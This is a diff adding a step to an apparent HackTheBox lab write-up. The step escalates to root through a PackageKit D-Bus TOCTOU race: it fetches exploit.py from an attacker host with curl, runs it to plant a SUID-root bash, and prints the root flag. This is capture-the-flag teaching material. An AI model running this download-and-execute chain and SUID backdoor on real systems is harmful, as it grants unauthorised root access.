@@ -2412,6 +2412,94 @@ PackageKit is confirmed as the escalation surface. Stage the CVE-2026-41651 expl
 <div align="center">
 <br>
 <br>
+※※※※※※※※※※※※※※※※※※※※※※※※
+<br>
+<br>
+<br>
+</div>
+
+#### 4.3 — Stage and execute the CVE-2026-41651 exploit
+
+**Why this step:**  
+PackageKit is confirmed present, D-Bus-activated, and root-owned (4.2). The target has no compiler (`gcc`/`cc`/`make` absent) but does have `dpkg-deb` and PyGObject, so the compiler-free Python exploit runs natively. The target has no internet egress, so the exploit is staged from the attacker host.
+
+###### Theory — the InstallFiles TOCTOU race:
+
+PackageKit exposes an `InstallFiles` method over the system D-Bus so an unprivileged user can request package installation, with polkit gating the operation. The flaw is a time-of-check to time-of-use gap: the authorisation decision and the file processing are not atomic.
+
+The exploit builds two `.deb` packages — a benign dummy and a payload whose maintainer `postinst` script installs a SUID-root bash — then issues two `InstallFiles` calls on the same transaction back to back. The first carries the SIMULATE flag (`4`) with the dummy; the second carries the real flag (`0`) with the payload. By racing them, the payload install is processed under the authorisation context established for the simulated transaction, bypassing the polkit prompt. The payload's `postinst` runs as root and drops a SUID shell.
+
+The payload action, verified in source before execution (see the source-review step preceding this), is a single line: `install -m 4755 /bin/bash /tmp/.suid_bash`. No network activity, no other side effects.
+
+**Command:**
+
+bash
+
+```bash
+# On the attacker host — serve the exploit from its directory:
+cd ~/Labs/HTB/SN11/Cohort/Pack2TheRoot
+python3 -m http.server 8000
+
+# On the target:
+cd /tmp
+curl -s http://10.10.15.77:8000/exploit.py -o exploit.py
+head -5 exploit.py          # verify: import os / import subprocess / ...
+python3 /tmp/exploit.py
+
+# In the resulting root shell:
+id
+cat /root/root.txt
+```
+
+**Breakdown:**
+
+|Component|Purpose|
+|---|---|
+|`http.server` run from `Pack2TheRoot/`|Serves the exploit. Must run in the directory containing `exploit.py` — running it from the parent returns 404, which curl saves as an HTML error page.|
+|`curl ... -o exploit.py`|Pulls only the reviewed script — not the repo's shipped `.bin` or `.deb`, neither of which the exploit uses.|
+|`head -5 exploit.py`|Sanity check that the fetched file is the script and not a 404 page. A file beginning `<!DOCTYPE HTML>` indicates a failed transfer.|
+|`python3 /tmp/exploit.py`|Runs the exploit. It builds both `.deb` packages locally with `dpkg-deb`, fires the racing D-Bus calls, polls for the SUID shell, and auto-execs it with `-p` on success.|
+|`-p` (in the auto-exec)|Prevents bash from dropping the elevated euid on startup, preserving root.|
+
+**Result:**
+
+```
+[*] CVE-2026-41651 — PackageKit LPE (Python Edition)
+[+] Packages generated at /tmp
+[+] Active trans: /2_abadcabc
+[*] Triggering flood of requests (SIMULATE -> REAL)...
+[*] Monitoring /tmp/.suid_bash ...
+....
+[+++] SUCCESS: /tmp/.suid_bash is SUID ROOT!
+.suid_bash-5.2# id
+uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
+.suid_bash-5.2# cat /root/root.txt
+d93f9948bc82862ea488b180bbe3ec88
+```
+
+**Analysis:**
+
+The prompt changes to `.suid_bash-5.2#` — the `#` denoting a root shell. `id` reports `uid=1000(marimo)` with `euid=0(root)`: the real UID is unchanged, but the effective UID is 0, which is the identity the kernel checks for file access. Reading `/root/root.txt`, permitted only to root, confirms full privilege. The race succeeded on the first attempt; TOCTOU exploits may require repeated runs, as the polling loop's timeout accommodates.
+
+**What this gives you:**
+
+**Key finding: root access achieved.** A SUID-root bash at `/tmp/.suid_bash` yields `euid=0`, and the root flag is readable.
+
+**Next:**  
+Both flags are captured. This completes the engagement; proceed to debrief, transferable takeaways, and remediation.
+
+---
+
+#### 🚩 ROOT FLAG
+
+```
+d93f9948bc82862ea488b180bbe3ec88
+```
+
+Read from `/root/root.txt` with `euid=0(root)` via SUID bash.
+<div align="center">
+<br>
+<br>
 ※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※※
 <br>
 </div>
